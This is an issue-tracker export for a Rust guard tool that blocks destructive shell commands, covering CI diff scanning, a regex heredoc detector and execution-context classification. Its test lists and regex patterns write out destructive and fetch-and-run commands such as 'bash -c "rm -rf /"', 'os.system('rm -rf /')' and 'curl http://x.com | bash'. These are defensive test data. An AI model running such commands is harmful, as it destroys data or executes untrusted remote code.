explain allowlist safety constraints (expiration, risk_ack)\n\n### 5) Privacy / secrets\n\n- Recommend redaction defaults.\n- Avoid printing full extracted commands in CI logs.\n\n### 6) Example configurations\n\n- `.dcg/hooks.toml` example for staged scanning.\n- Example pre-commit hook snippet (and optional managers: husky/lefthook).\n\n## Acceptance criteria\n\n- A user can adopt scan-precommit without reading source.\n- Docs explicitly warn against turning on warning-as-fail immediately.\n- Docs show exactly how to resolve false positives safely.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:10.920878487-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:30:51.834974021-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4.4","depends_on_id":"git_safety_guard-scan.4","type":"parent-child","created_at":"2026-01-07T21:18:34.725455653-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.4","depends_on_id":"git_safety_guard-scan.4.1","type":"blocks","created_at":"2026-01-07T21:25:41.044919711-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.4","depends_on_id":"git_safety_guard-1gt.2.3","type":"blocks","created_at":"2026-01-07T21:25:46.278526462-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.5","title":"CI integration for dcg scan (PR diff scanning + PR summary)","description":"## Objective\n\nProvide a \"team-wide\" safety net by running `dcg scan` in CI for pull requests.\n\n## Background\n\nLocal hooks are not always installed or are bypassed (`--no-verify`). CI is where:\n\n- the org can enforce safety rules\n- results can be reviewed centrally\n- rollouts can start in warn-only mode (avoid blocking velocity)\n\n## Proposed MVP (GitHub Actions)\n\n### 1) Workflow snippet (no marketplace action yet)\n\n- A documented GitHub Actions workflow that:\n  - checks out full history (diff computation)\n  - builds `dcg` (or downloads release artifact later)\n  - runs `dcg scan --git-diff \u003cbase\u003e...HEAD --format json --fail-on error`\n  - uploads the JSON artifact\n\n### 2) Human-readable PR summary\n\n- Render a concise Markdown summary to the job log (and optionally as a PR comment):\n  - top N findings, grouped by file\n  - per finding: line, extracted command (truncated), rule id, reason, suggestion\n  - totals by severity (error/warn/info)\n\n### 3) Rollout model\n\n- Default recommendation:\n  - start with `--fail-on error` only\n  - treat warnings as advisory for 1-2 weeks\n  - tighten after allowlists are created\n\n## Output requirements\n\n- JSON schema must be stable:\n  - include `file`, `line`, `extractor_id`, `extracted_command`, `decision`, `rule_id`, `reason`, `suggestion?`\n- CI mode should have deterministic ordering.\n\n## Security/privacy\n\n- Provide a `--redact` option (or config) for commands that might contain secrets.\n- CI should avoid printing entire extracted commands if they are very long.\n\n## Acceptance criteria\n\n- `dcg scan --git-diff ...` handles empty diffs cleanly (0 findings, exit 0).\n- A workflow snippet exists in docs or templates and is proven to run in this repo.\n- When errors exist, CI fails with an actionable summary.\n- When warnings exist (and `--fail-on error`), CI passes but prints the warnings clearly.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- CI should default to diff-only scanning and warn-first rollout.\n- PR comments must clearly show extracted executed commands so reviewers can judge signal.\n\n### Tests\n- `git_safety_guard-scan.5.3` covers `--git-diff` integration behavior.\n- Add at least one end-to-end CI fixture that includes:\n  - a true positive in an executed context\n  - a data-only dangerous string that must not be flagged","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:56:31.299265569-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:28:51.436024163-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.5","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:56:40.548508411-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5","depends_on_id":"git_safety_guard-scan.2","type":"blocks","created_at":"2026-01-07T21:23:47.19945344-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5","depends_on_id":"git_safety_guard-scan.3","type":"blocks","created_at":"2026-01-07T21:23:52.295002514-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.5.1","title":"CI: workflow template for PR diff scanning","description":"## Objective\n\nProvide a copy/paste GitHub Actions workflow snippet for:\n\n- building (or downloading) `dcg`\n- running `dcg scan --git-diff \u003cbase\u003e...HEAD --format json --fail-on error`\n- uploading artifacts\n\n## Acceptance criteria\n\n- Documented and tested in this repo.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- Provide a default `--fail-on error` policy (warn-only for warnings).\n- Make it easy to scope to diff-only files to avoid noise on large repos.\n\n### Tests\n- Validate the workflow in `git_safety_guard-scan.5.3` by running against a fixture repo in CI.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:47.608110165-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:29:02.572818656-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.5.1","depends_on_id":"git_safety_guard-scan.5","type":"parent-child","created_at":"2026-01-07T21:19:07.365697932-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.1","depends_on_id":"git_safety_guard-scan.2.3","type":"blocks","created_at":"2026-01-07T21:26:00.560850741-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.5.2","title":"CI: optional PR comment renderer (top findings)","description":"## Objective\n\nOptionally render a concise Markdown summary suitable for PR comments.\n\n## Requirements\n\n- Input: scan JSON schema v1.\n- Output:\n  - grouped by file\n  - severity-first ordering (error, warning, info)\n  - include per finding:\n    - file:line\n    - rule_id\n    - short reason\n    - truncated/redacted command preview\n    - suggestion (if available)\n\n## Markdown UX\n\n- Use `\u003cdetails\u003e\u003csummary\u003e` blocks per file to keep comments compact.\n- Hard cap output size:\n  - top N findings overall\n  - per-file top M\n\n## Determinism\n\n- Sorting rules are deterministic and documented.\n\n## Acceptance criteria\n\n- Renderer output is deterministic and test-covered.\n- Renderer never prints unredacted full commands when redaction is enabled.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:52.707720678-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:23:20.976031442-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.5.2","depends_on_id":"git_safety_guard-scan.5","type":"parent-child","created_at":"2026-01-07T21:19:12.458474915-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.2","depends_on_id":"git_safety_guard-scan.5.1","type":"blocks","created_at":"2026-01-07T21:26:05.839049463-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.2","depends_on_id":"git_safety_guard-scan.2.3","type":"blocks","created_at":"2026-01-07T21:26:11.120494138-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.5.3","title":"CI: scan --git-diff integration tests","description":"## Objective\n\nAdd integration tests ensuring `dcg scan --git-diff`:\n\n- returns deterministic results\n- handles empty diffs\n- handles renamed/moved files gracefully\n\n## Logging requirements\n\n- Tests should log the diff range and files considered.\n\n## Test plan\n\n- Create a temp repo with two commits.\n- Modify files across commits to cover:\n  - added file\n  - modified file\n  - renamed file\n  - deleted file (should be skipped gracefully)\n- Run `dcg scan --git-diff \u003cbase\u003e..\u003chead\u003e` and assert:\n  - deterministic ordering\n  - stable JSON (if using `--json`)\n  - correct exit code per `--fail-on`\n\n## Acceptance Criteria\n\n- `dcg scan --git-diff \u003crange\u003e` succeeds on:\n  - empty diffs (exit 0, no findings)\n  - renames/moves (scans new path, no crash)\n  - deletes (skips missing paths, no crash)\n- Output is deterministic across runs.\n- Tests emit enough logs (diff range, candidate files, filtered files) to debug failures in CI.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive regression\nInclude a negative fixture in the diff-range test:\n\n- a file where a dangerous string appears only in docs/comments and must not produce a finding\n\nThis prevents CI adoption from being derailed by noisy PR checks.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:57.803468576-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:29:13.151737325-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.5.3","depends_on_id":"git_safety_guard-scan.5","type":"parent-child","created_at":"2026-01-07T21:19:17.551755437-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.3","depends_on_id":"git_safety_guard-scan.2.2","type":"blocks","created_at":"2026-01-07T21:26:16.363785468-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.3","depends_on_id":"git_safety_guard-scan.2.3","type":"blocks","created_at":"2026-01-07T21:26:21.594148009-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.3","depends_on_id":"git_safety_guard-scan.3.5","type":"blocks","created_at":"2026-01-07T21:26:26.844970733-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.5.4","title":"Optional: package dcg scan as a reusable GitHub Action","description":"## Objective\n\nPackage `dcg scan` into a reusable GitHub Action for easier org-scale adoption.\n\n## Why optional\n\nA workflow snippet is enough to start. A marketplace action is accretive once:\n\n- the scan JSON schema is stable\n- allowlisting workflow is mature\n- false positives are under control\n\n## Requirements\n\n- Action inputs:\n  - `fail_on`\n  - `scan_paths` or diff mode\n  - `comment_on_pr`\n- Action outputs:\n  - summary counts\n  - artifact upload\n\n## Acceptance criteria\n\n- Example repo can adopt by adding a few lines.\n- Action pins a specific dcg version (no surprise upgrades).\n","notes":"## Review Additions (2026-01-08)\n\n### Tests\n- Validate the action packaging with an end-to-end workflow in a fixture repo:\n  - ensures correct exit codes\n  - ensures deterministic output\n  - ensures redaction/truncation does not break parsing","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T21:28:09.562467338-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:30:54.27869809-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.5.4","depends_on_id":"git_safety_guard-scan.5","type":"parent-child","created_at":"2026-01-07T21:43:33.082509684-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.4","depends_on_id":"git_safety_guard-scan.1","type":"blocks","created_at":"2026-01-07T21:43:54.301284345-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.4","depends_on_id":"git_safety_guard-scan.2.3","type":"blocks","created_at":"2026-01-07T21:43:59.341416862-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.4","depends_on_id":"git_safety_guard-scan.5.1","type":"blocks","created_at":"2026-01-07T21:44:04.378980832-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.4","depends_on_id":"git_safety_guard-1gt.2","type":"blocks","created_at":"2026-01-07T21:44:09.420139301-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.4","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T21:44:14.458422044-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.5.4","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:44:19.495891555-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.6","title":"Additional scan extractors (package.json, compose, Terraform, GitLab CI)","description":"## Objective\n\nExpand `dcg scan` coverage with additional *high-signal executable contexts* that frequently contain destructive commands in real repos, while keeping false positives low.\n\nThis feature is intentionally **post-MVP**: we only do it after the scan schema + core CLI are stable.\n\n## Why this matters\n\nTeams commonly introduce destructive commands via:\n\n- `package.json` lifecycle scripts\n- `docker-compose.yml` `command`/`entrypoint`/`healthcheck.test`\n- Terraform provisioners (`local-exec` / `remote-exec`)\n- GitLab CI `.gitlab-ci.yml` `script:` arrays\n\nThese are *executed contexts*, so scanning them has a high signal-to-noise ratio if extraction is done precisely.\n\n## Guardrails (false-positive immunity)\n\n- Only extract fields that are unquestionably executed.\n- Explicitly ignore data-only fields like `description`, `env`, `variables`, `labels`, etc.\n- Preserve line numbers and a stable `extractor_id`.\n- Provide redaction/truncation controls for potentially sensitive commands.\n\n## Acceptance criteria\n\n- Each extractor has fixtures that prove boundaries (executed extracted; data ignored).\n- Extractors handle common YAML/JSON features (arrays, block scalars, anchors/aliases where applicable).\n- Output is deterministic and stable for golden tests.\n\n## Dependencies\n\n- `git_safety_guard-scan.1` (schema)\n- `git_safety_guard-scan.2` (CLI + file selection)\n","status":"open","priority":3,"issue_type":"feature","created_at":"2026-01-07T21:45:03.500293012-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:45:03.500293012-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.6","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T21:45:11.633154629-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.6","depends_on_id":"git_safety_guard-scan.1","type":"blocks","created_at":"2026-01-07T21:45:21.353464231-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.6","depends_on_id":"git_safety_guard-scan.2","type":"blocks","created_at":"2026-01-07T21:45:26.391276899-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t1rx","title":"Implement Tier 1 regex heredoc detector with RegexSet","description":"# Tier 1: Fast Regex Heredoc Detection\n\n## Objective\n\nImplement the fast-path heredoc detector using Rust's `regex` crate with RegexSet for multi-pattern matching.\n\n## Why RegexSet?\n\nThe `regex` crate's RegexSet allows matching against multiple patterns simultaneously with:\n- Aho-Corasick algorithm for literal prefixes\n- SIMD acceleration (AVX2, SSE4.2)\n- Single pass through input\n- O(n) guaranteed time complexity\n\n## Patterns to Implement\n\n```rust\nstatic HEREDOC_PATTERNS: LazyLock\u003cRegexSet\u003e = LazyLock::new(|| {\n    RegexSet::new([\n        // Bash heredocs\n        r\"\u003c\u003c-?\\s*['\\\"]?\\w+['\\\"]?\",   // \u003c\u003cEOF, \u003c\u003c'EOF', \u003c\u003c-EOF\n        r\"\u003c\u003c\u003c\",                          // Here-strings\n\n        // Inline script flags\n        r\"\\b(python3?|python)\\s+-[ce]\\s\",\n        r\"\\b(ruby|irb)\\s+-e\\s\",\n        r\"\\bperl\\s+-[eE]\\s\",\n        r\"\\bnode\\s+-[ep]\\s\",\n        r\"\\b(sh|bash|zsh|fish)\\s+-c\\s\",\n\n        // Pipe to interpreter\n        r\"\\|\\s*(python3?|ruby|perl|node|sh|bash)\\b\",\n        r\"\\|\\s*xargs\\s\",\n    ]).expect(\"heredoc patterns compile\")\n});\n```\n\n## API\n\n```rust\n/// Check if command might contain heredoc/inline script\n/// Returns true if ANY pattern matches (fast path triggers Tier 2)\npub fn might_contain_heredoc(cmd: \u0026str) -\u003e bool;\n\n/// Get which patterns matched (for debugging/logging)\npub fn matched_heredoc_patterns(cmd: \u0026str) -\u003e Vec\u003cusize\u003e;\n```\n\n## Performance Target\n\n- \u003c 10 microseconds for typical commands\n- Zero allocations on non-match path\n- Must have ZERO false negatives (can have false positives)\n\n## Test Cases\n\n### Must Match (true positives)\n- `python3 \u003c\u003c 'EOF'\\nprint('hi')\\nEOF`\n- `bash -c 'echo hello'`\n- `node -e \"console.log(1)\"`\n- `curl http://x.com | bash`\n- `cat \u003c\u003c EOF | python3`\n\n### Must NOT Match (true negatives)\n- `git status`\n- `ls -la`\n- `cargo build`\n- `echo \"hello world\"`\n\n### May Match (acceptable false positives)\n- `grep -e pattern file` (has -e but not dangerous)\n- `echo \"\u003c\u003cEOF\"` (string contains heredoc marker)\n\n## Dependencies\n\n- regex = \"1.10\" (add to Cargo.toml)\n- Depends on: Two-tier architecture design (2ta)\n\n## Acceptance Criteria\n\n- `might_contain_heredoc` returns true for all “Must Match” cases.\n- `might_contain_heredoc` returns false for all “Must NOT Match” cases.\n- Detector adds effectively-zero overhead for non-matching commands (validate via benchmark once perf harness exists).\n- Patterns are compiled once (static) and never per-invocation.\n","status":"closed","priority":1,"issue_type":"task","assignee":"SunnyMill","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-08T01:43:47.858027873-05:00","closed_at":"2026-01-08T01:43:47.858027873-05:00","close_reason":"Implementation complete in src/heredoc.rs. All acceptance criteria met:\n- check_triggers() (equiv. to might_contain_heredoc) detects all heredoc/inline script patterns\n- matched_triggers() provides debugging indices\n- Uses LazyLock\u003cRegexSet\u003e for static compilation, SIMD-accelerated matching\n- 12 unit tests passing covering all required test cases\n- Additional patterns included: fish -c, xargs pipe, \u003c\u003c~ Ruby heredocs","dependencies":[{"issue_id":"git_safety_guard-t1rx","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T19:28:32.034477208-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-t1rx","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:39.537459716-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x","title":"Epic: False Positive Immunity (Execution Context)","description":"# Epic: False Positive Immunity (Execution Context)\n\n## Why this epic exists\n\nA destructive-command guard must be *trusted*. Repeated false positives destroy velocity and lead users to disable the guard entirely.\n\nThe core failure mode is **context blindness**: matching dangerous substrings in places where they are clearly *data*, not *executed code*.\n\nExamples that must be allowed:\n\n- `bd create --description=\"This pattern blocks rm -rf\"`\n- `git commit -m \"Fix git reset --hard detection\"`\n- `echo \"example: git push --force\"`\n- `rg -n \"rm -rf\" src/main.rs`\n\nCurrently, a purely regex-based guard will often match `rm -rf` (or similar) inside quoted strings and block legitimate documentation/testing work.\n\n## Key idea\n\nIntroduce an **Execution Context layer** that classifies which parts of the command line are actually executed vs merely data.\n\nThen, apply destructive patterns only to executable contexts:\n\n- Executed command words and arguments\n- Pipe targets (right side of `|`)\n- Command substitution (`$(...)`, backticks)\n- Inline interpreter strings (`bash -c`, `python -c`, `node -e`, etc.)\n- Heredoc bodies (handled by the heredoc epic)\n\n…and **skip** matching for clearly data-only contexts:\n\n- Option values for known “documentation/metadata” commands (Beads `bd`, git commit messages, etc.)\n- Grep/Ripgrep pattern arguments\n- Echo/printf arguments\n\n## Goals\n\n1. **Dramatically reduce false positives** for doc/test workflows while preserving true-positive blocks for real execution.\n2. **Keep performance high:** the non-risky path should stay microseconds.\n3. **Provide explainability hooks:** when a command is allowed due to data-context detection, we should be able to explain why (for debugging).\n\n## Architectural constraints\n\n- This layer runs before pack regex evaluation and before AST/heredoc scanning.\n- It must be conservative: if context is ambiguous, treat as executable (or escalate to deeper analysis), but avoid blocking obvious documentation strings.\n\n## Success Criteria\n\n- The examples in “Why this epic exists” are allowed.\n- Real executions are still blocked:\n  - `bash -c \"rm -rf /\"`\n  - `echo hi | bash -c \"rm -rf /\"`\n  - `python -c \"import os; os.system('rm -rf /')\"`\n- Context classification has regression tests for:\n  - quoting (single/double/escaped)\n  - pipes\n  - command substitution\n  - xargs\n  - interpreter flags (-c/-e/-p)\n\n## Notes for future self\n\n- If we add a “warn mode” or confidence scoring, this epic provides the context signals.\n- Don’t overfit to specific tools; start with a minimal safe-string-arg registry and expand based on real false positives.\n","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-07T19:57:23.162019558-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:51:22.160543876-05:00","dependencies":[{"issue_id":"git_safety_guard-t8x","depends_on_id":"git_safety_guard-yza","type":"relates-to","created_at":"2026-01-07T21:53:37.084188042-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x.1","title":"Define Safe String-Argument Registry v1 (commands + flags)","description":"## Objective\n\nCreate a **versioned** registry of commands whose arguments are predominantly *data*, not code, so we can suppress false positives without compromising safety.\n\n## Background\n\nMany developer workflows involve writing *about* dangerous commands:\n\n- issue trackers (`bd create --description=...`)\n- git commit/tag messages (`git commit -m ...`)\n- search tools (`rg -e \"rm -rf\" ...`)\n- printing examples (`echo \"git reset --hard\"`)\n\nWithout recognizing these contexts, regex matching will cause velocity-destroying false positives.\n\n## Scope (v1)\n\nStart with a small, high-value registry:\n\n### Always-data commands\n\n- `echo`, `printf`\n\n### Beads CLI\n\n- `bd create`: `--description`, `--title`, `--notes`\n- `bd update`: `--description`, `--title`, `--notes`\n\n### Git messages\n\n- `git commit -m`, `git commit --message`\n- `git tag -m`, `git tag --message`\n- `git notes add -m`\n\n### Search tools\n\n- `grep` pattern args (`-e`, `--regexp`, `-F`, `--fixed-strings`)\n- `rg` pattern args (`-e`, `--regexp`, `--fixed-strings`)\n\n### Optional candidates (add only with tests)\n\n- `sed` scripts in `-e` (can be code; treat as code, not data)\n- `awk` programs (code; treat as code)\n\n## Design requirements\n\n- Registry must be **explicit and test-driven**.\n- Registry must be conservative: only suppress matching where we are confident strings are not executed.\n- Provide a way to extend the registry via config in the future (but do not over-engineer).\n\n## Acceptance criteria\n\n- Add unit tests for each registry entry demonstrating at least one previously false-positive case that is now allowed.\n- Add at least one counterexample test per category to ensure we do not suppress *real* execution (e.g., `bash -c \"rm -rf /\"` must still be evaluated).\n","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:02:56.784418941-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:40:13.132797997-05:00","closed_at":"2026-01-08T00:40:13.132797997-05:00","close_reason":"Implemented SafeStringRegistry v1 with: all_args_data (echo, printf), flag_data_pairs (git -m, bd --description/--title/--notes/--reason, grep -e/-F, rg -e/--fixed-strings, gh -t/-b/-m, cargo --message, npm --message). Includes SafeFlagEntry with short/both/long constructors and SAFE_STRING_REGISTRY static. 25+ unit tests verify registry behavior. All 98 lib + 92 main + 137 E2E tests pass.","dependencies":[{"issue_id":"git_safety_guard-t8x.1","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:02:56.795312367-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x.2","title":"Implement execution-context classification (pipes, subst, quoting)","description":"## Objective\n\nImplement a fast execution-context classifier that identifies which parts of a command line are executed vs data.\n\n## Background\n\nA safe-string registry alone is insufficient. We must correctly classify contexts such as:\n\n- pipes: `echo hi | bash -c \"...\"`\n- command substitution: `$(dangerous command)`\n- backticks: `` `dangerous command` ``\n- xargs: `printf '%s\\n' arg1 arg2 | xargs cmd`\n- inline interpreter flags: `bash -c`, `python -c`, `node -e`, etc.\n\nThese contexts are **executable** even if they appear inside quotes.\n\n## SpanKind Enum Definition\n\n```rust\n/// Classification of a command-line span\n#[derive(Debug, Clone, Copy, PartialEq, Eq)]\npub enum SpanKind {\n    /// Command word or unquoted argument - fully executed\n    Executed,\n\n    /// Quoted argument to a known-safe command (e.g., git commit -m \"...\")\n    Argument,\n\n    /// Content of -c/-e flags (bash -c, python -c, node -e)\n    /// Must be scanned for destructive patterns\n    InlineCode,\n\n    /// Single-quoted string - no variable substitution possible\n    /// Always safe to skip pattern matching\n    Data,\n\n    /// Heredoc body - escalate to Tier 2/3 analysis\n    HeredocBody,\n\n    /// Ambiguous context - treat as Executed (conservative)\n    Unknown,\n}\n```\n\n## Conservative Design Principle\n\n**\"Ambiguous → Executed\"**\n\nIf classification is uncertain, we MUST NOT suppress pattern matching. The priority order is:\n\n1. **Correctness over convenience**: Never allow a destructive command due to misclassification\n2. **False positives over false negatives**: A blocked safe command is annoying; an allowed destructive command is catastrophic\n3. **Explicit over implicit**: Only suppress matching for contexts we are 100% confident are data\n\n## Quoting Rules\n\n| Quote Type | Contains `$()` or backticks? | Classification |\n|------------|------------------------------|----------------|\n| Single quotes (`'...'`) | N/A (no expansion) | `Data` |\n| Double quotes (`\"...\"`) | No | `Argument` (if safe cmd) or `Unknown` |\n| Double quotes (`\"...\"`) | Yes | `InlineCode` or `Unknown` |\n| Unquoted | - | `Executed` |\n\n## Approach\n\n### Phase 1 (minimal, high ROI)\n\n- Tokenize the shell command line with a small, purpose-built tokenizer:\n  - recognize single quotes, double quotes, backslash escapes\n  - recognize operators: `|`, `\u0026\u0026`, `||`, `;`, `$(...)`, backticks\n  - identify the first word of each pipeline segment as the executed command\n\n### Phase 2 (harder cases)\n\n- Recognize `xargs` invocation patterns where subsequent tokens become executed commands.\n- Recognize `env VAR=... cmd` wrappers.\n- Recognize `sudo` prefix.\n\n### Phase 3 (optional)\n\n- Replace tokenizer with tree-sitter-bash if maintenance burden becomes high.\n\n## Output Model\n\nProduce a lightweight structure:\n\n```rust\npub struct CommandSpans {\n    spans: Vec\u003cSpan\u003e,\n}\n\npub struct Span {\n    pub kind: SpanKind,\n    pub byte_range: std::ops::Range\u003cusize\u003e,\n}\n```\n\nThe decision engine applies pack regexes only to `Executed`/`InlineCode`/`HeredocBody` spans (never to pure `Data`).\n\n## Safety Rules\n\n1. Single quotes are ALWAYS `Data` - no exceptions\n2. Double quotes with command substitution are ALWAYS `Unknown` or `InlineCode`\n3. Pipe targets are ALWAYS `Executed`\n4. Command substitution content is ALWAYS `InlineCode`\n5. Backtick content is ALWAYS `InlineCode`\n\n## Performance Budget\n\n- Classification adds \u003c100μs to typical commands\n- Zero allocations for simple commands (no pipes, no substitution)\n- Early exit for commands that are obviously simple\n\n## Acceptance Criteria\n\n- Unit tests cover:\n  - quoting and escaping\n  - pipes and separators\n  - command substitution and backticks\n  - bash/python/node inline code flags\n- Demonstrate the classifier allows documentation strings but still blocks real executions.\n- Performance: classification adds \u003c100μs to typical commands.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:03:13.621823546-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:31:56.328292556-05:00","closed_at":"2026-01-08T00:31:56.328292556-05:00","close_reason":"Implemented execution-context classification module (src/context.rs): SpanKind enum (Executed, Argument, InlineCode, Data, HeredocBody, Unknown), Span/CommandSpans structures, shell tokenizer for quotes/pipes/substitution/inline-code detection (bash -c, python -c, etc.). 26 unit tests including performance verification (0.10μs/command, well under 100μs budget). All 92 unit + 137 E2E tests pass.","dependencies":[{"issue_id":"git_safety_guard-t8x.2","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:03:13.623130597-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x.3","title":"E2E regression: false positives vs real execution contexts","description":"## Objective\n\nExpand end-to-end coverage to ensure the execution-context layer prevents false positives without introducing false negatives.\n\n## Scope\n\nAdd E2E cases for:\n\n### Must ALLOW (data contexts)\n\n- `bd create --description=\"Pattern blocks rm -rf\"`\n- `bd update \u003cid\u003e --notes \"example: git reset --hard\"`\n- `git commit -m \"Fix git push --force detection\"`\n- `git tag -m \"Document rm -rf\" v1.2.3`\n- `echo \"example: kubectl delete namespace prod\"`\n- `rg -n \"rm -rf\" src/main.rs`\n- `grep -e \"DROP TABLE\" schema.sql`\n\n### Must BLOCK (executed contexts)\n\n- `bash -c \"rm -rf /\"`\n- `echo hi | bash -c \"rm -rf /\"`\n- `python -c \"import os; os.system('rm -rf /')\"`\n- `node -e \"require('child_process').execSync('rm -rf /')\"`\n- `echo $(rm -rf /tmp/foo)` (command substitution)\n- ``echo `rm -rf /tmp/foo` `` (backticks)\n\n### Edge cases\n\n- mixed quoting and escapes\n- `sudo` prefix\n- `env VAR=... bash -c ...`\n\n## Logging requirements\n\n- E2E runner must print for each test:\n  - description\n  - command (possibly truncated)\n  - expected allow/block\n  - actual decision\n  - if blocked: pack_id/pattern_name (once available)\n\n## Acceptance criteria\n\n- E2E suite runs in CI and produces a clear failure summary listing failed cases.\n- At least one test proves that docs strings containing dangerous substrings are allowed.\n","status":"closed","priority":1,"issue_type":"task","assignee":"PurpleRobin","created_at":"2026-01-07T20:03:29.812660747-05:00","created_by":"ubuntu","updated_at":"2026-01-08T01:52:31.499541378-05:00","closed_at":"2026-01-08T01:52:31.499541378-05:00","close_reason":"Added robust execution-context E2E regression section (allow vs executed), fixed JSON escaping + per-test logging","dependencies":[{"issue_id":"git_safety_guard-t8x.3","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:03:29.813900562-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-t8x.3","depends_on_id":"git_safety_guard-99e.5","type":"blocks","created_at":"2026-01-07T20:09:05.564047374-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t8x.4","title":"Optional: safe cleanup rules for common build dirs (reduce rm -rf friction)","description":"## Objective\n\nReduce real-world friction where users legitimately want to delete *known build/output directories* while keeping `rm -rf` protections strong.\n\n## Problem\n\nToday `core.filesystem` blocks `rm -rf` outside temp dirs. This is safe but can be disruptive for common workflows like:\n\n- `rm -rf target/` (Rust)\n- `rm -rf dist/` / `build/` (frontend)\n- `rm -rf .next/` / `.turbo/` (framework caches)\n\nUsers often want to run these during development, and repeated blocks create pressure to disable the guard.\n\n## Design options\n\n### Option A (recommended): separate opt-in pack\n\n- Add a `safe.cleanup` pack (disabled by default) that contains **safe patterns** allowing:\n  - relative paths only\n  - exact directory allowlist (no globs that can escape)\n  - explicit rejection of `..` path traversal\n\n### Option B: config allowlist for safe rm paths\n\n- Allow users to configure a list of safe relative directories.\n- More flexible but easier to misconfigure.\n\n## Safety constraints (non-negotiable)\n\n- Never allow absolute paths via this feature.\n- Never allow `..` segments.\n- Never allow an empty path or `/`.\n- Prefer narrow, explicit matches.\n\n## Acceptance criteria\n\n- With the feature enabled, `rm -rf target/` is allowed.\n- Commands like `rm -rf ../target/` and `rm -rf /home/user/target` remain blocked.\n- Comprehensive unit tests cover path-traversal edge cases.\n\n## Dependencies\n\n- `git_safety_guard-1gt.2` (rule-id allowlisting) may reduce the need for this, but this feature is still valuable because it is safer than allowlisting broad rm rules.\n","status":"open","priority":3,"issue_type":"feature","created_at":"2026-01-07T22:04:53.638760335-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:04:53.638760335-05:00","dependencies":[{"issue_id":"git_safety_guard-t8x.4","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T22:05:04.291302179-05:00","created_by":"ubuntu"}]}
